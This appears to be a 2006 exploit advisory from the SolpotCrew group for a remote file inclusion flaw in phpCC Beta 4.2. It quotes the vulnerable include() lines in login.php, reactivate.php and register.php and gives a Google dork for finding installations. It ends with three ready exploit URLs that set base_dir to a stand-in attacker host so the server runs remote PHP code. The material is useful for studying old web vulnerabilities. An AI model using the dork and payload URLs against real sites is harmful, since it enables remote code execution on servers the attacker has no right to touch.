@@ -1,0 +1,72 @@
+#############################SolpotCrew Community################################
+#
+#        phpCC - Beta 4.2 (base_dir) Remote File Inclusion 
+#
+#        Download file : http://www.phpcc.at/download_file1.html
+#
+#################################################################################
+#
+#
+#       Bug Found By :Solpot a.k.a (k. Hasibuan) (06-08-2006)
+#
+#       contact: chris_hasibuan@yahoo.com 
+# 
+#       Website : http://www.solpotcrew.org/adv/solpot-adv-05.txt
+#
+################################################################################
+#
+#
+#      Greetz: choi , h4ntu , Ibnusina , r4dja , No-profile , begu , madkid
+#              robby , Matdhule , setiawan , m3lky , NpR , Fungky , barbarosa
+#              home_edition2001 , Rendy , cow_1seng , ^^KaBRuTz , bYu , Lappet
+#              Blue|spy , cah|gemblung , Slacky , blind_boy
+#              and all member solpotcrew community @ http://solpotcrew.org/forum/
+#
+#
+###############################################################################
+Input passed to the "base_dir" is not properly verified 
+
+before being used to include files. This can be exploited to execute 
+arbitrary PHP code by including files from local or external resources.
+
+code from login.php
+
+<?php
+define('PHPCC', true);
+define('SITE', 'login.php');
+
+include($base_dir."includes/common.php");
+include($base_dir."includes/header.php");
+
+switch( $_GET['action'] )
+
+code from reactivate.php
+
+define('PHPCC', true);
+
+include($base_dir."includes/config.php");
+include($base_dir."includes/constants.php");
+include($base_dir."includes/functions.php");
+include($base_dir.'includes/sessions.php');
+
+if( $_POST['submit'] == true )
+
+code from register.php
+
+<?php
+define('PHPCC', true);
+define('SITE', 'register.php');
+
+include( $base_dir . "includes/common.php" );
+include( $base_dir . "includes/header.php" );
+
+Google dork : "Powered by phpCC Beta 4.2"
+
+exploit : http://somehost/login.php?base_dir=http://evilcode
+          http://somehost/reactivate.php?base_dir=http://evilcode
+          http://somehost/register.php?base_dir=http://evilcode
+
+##############################MY LOVE JUST FOR U RIE#########################
+######################################E.O.F##################################
+
+# milw0rm.com [2006-08-07]
